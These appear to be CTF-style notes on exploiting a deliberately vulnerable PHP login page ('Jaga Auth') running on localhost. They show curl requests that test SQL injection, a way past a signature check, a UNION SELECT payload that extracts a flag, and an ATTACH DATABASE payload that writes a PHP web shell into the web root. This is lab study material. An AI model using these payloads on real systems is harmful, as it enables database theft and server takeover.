
# SQL Injection

```php
<?php
    $SECRET = getenv('SECRET');
    if (isset($_GET["uid"])) {
        $uri = explode('|', substr($_SERVER["REQUEST_URI"], strpos($_SERVER["REQUEST_URI"], "?") + 1));
        $paramstr = urldecode($uri[0]);
        $params = parse_url('?' . $paramstr);
        parse_str($params['query'], $params);
        $sig = $uri[1];
        echo $sig . "<br>";
        echo $paramstr . "<br>";
        echo hash("sha256", $SECRET . $paramstr) . "<br>";
        if ($sig !== hash("sha256", $SECRET . $paramstr)) {
            http_response_code(404);
            include('404.php'); 
            die();
        }
    }
    else {
        header("Location: /");
        die();
    }
    if (isset($params["uid"])) {
        $uid = $params["uid"];
        $db = new PDO('sqlite:jaga.db');
        echo "<span>SELECT * FROM j4g4_us3rs WHERE uid = '$uid'</span>"; // Custom Comment
        $user = $db->prepare("SELECT * FROM j4g4_us3rs WHERE uid = '$uid'");
        $user->execute();
        $user = $user->fetch();
        if (!$user) {
            $user = array(
                "username" => "Guest",
                "role" => 0
    
        );
?>
<html>
    <head>
        <title>Jaga Auth</title>
        <link rel="stylesheet" href="static/style.css">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Silkscreen&display=swap" rel="stylesheet">
    </head>
    <body>
        <div class="nav">
            <div>
                <a href="index.php">Home</a>
                <a href="register.php">Register</a>
            </div>
            <a href="profile.php">Profile</a>
        </div>
        <div class="body">
            <h1>Jaga Auth</h1>
            <?php 
                if ($user) {
                    echo "<h2>Welcome, " . $user["username"] . "!</h2>";
                }
                else //echo "Sorry, not authorized.";
            ?>
        </div>
    </body>
</html>


```

SQL Injection?

http://localhost/profile.php?uid=34b9bdd9cdc5078970d06e39bd211ea5579db090f75dc5b9b4efad3e3e3fb06c|73905a868cc6e227b37e4c5e0a02b30b8e363f90733fc0fd98d22fd66e551eff

![[Pasted image 20221203022956.png]]

http://localhost/profile.php?uid=34b9bdd9cdc5078970d06e39bd211ea5579db090f75dc5b9b4efad3e3e3fb06c|73905a868cc6e227b37e4c5e0a02b30b8e363f90733fc0fd98d22fd66e551eff%22;--

![[Pasted image 20221203023027.png]]

![[Pasted image 20221203023120.png]]


### Syntax

Comments are done using `#`

```bash
(base) [hacker@hackerbook web_extended]$ curl "http://localhost/profile.php?uid=34b9bdd9cdc5078970d06e39bd211ea5579db090f75dc5b9b4efad3e3e3fb06c|73905a868cc6e227b37e4c5e0a02b30b8e363f90733fc0fd98d22fd66e551eff'#--" && echo
73905a868cc6e227b37e4c5e0a02b30b8e363f90733fc0fd98d22fd66e551eff'<br>uid=34b9bdd9cdc5078970d06e39bd211ea5579db090f75dc5b9b4efad3e3e3fb06c<br>73905a868cc6e227b37e4c5e0a02b30b8e363f90733fc0fd98d22fd66e551eff<br>Oops
(base) [hacker@hackerbook web_extended]$ curl "http://localhost/profile.php?uid=34b9bdd9cdc5078970d06e39bd211ea5579db090f75dc5b9b4efad3e3e3fb06c|73905a868cc6e227b37e4c5e0a02b30b8e363f90733fc0fd98d22fd66e551eff'--" && echo
73905a868cc6e227b37e4c5e0a02b30b8e363f90733fc0fd98d22fd66e551eff'--<br>uid=34b9bdd9cdc5078970d06e39bd211ea5579db090f75dc5b9b4efad3e3e3fb06c<br>73905a868cc6e227b37e4c5e0a02b30b8e363f90733fc0fd98d22fd66e551eff<br>Oops
(base) [hacker@hackerbook web_extended]$ 
```

Spaces can cause errors

```
(base) [hacker@hackerbook web_extended]$ curl "http://localhost/profile.php?uid=34b9bdd9cdc5078970d06e39bd211ea5579db090f75dc5b9b4efad3e3e3fb06c|73905a868cc6e227b37e4c5e0a02b30b8e363f90733fc0fd98d22fd66e551eff' # " && echo
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.54 (Debian) Server at 172.17.0.4 Port 80</address>
</
```


### Bypassing Hashfunc


SHA256 hash this
```
REDACTEDuid=
```

```
{SECRET}uid={uid}
```


## SQL Query

http://localhost/profile.php?|b83c7778c23a8d199def24fba1e96d24338d2bd9d859b613fde9a9a9077d88ec|&uid=1&test=1%27%20UNION%20SELECT%201,flag,1,1,1%20FROM%20j4g4_us3rs;--

```
ATTACH DATABASE '/var/www/html/lol.php' AS lol;CREATE TABLE lol.pwn (dataz text);INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
```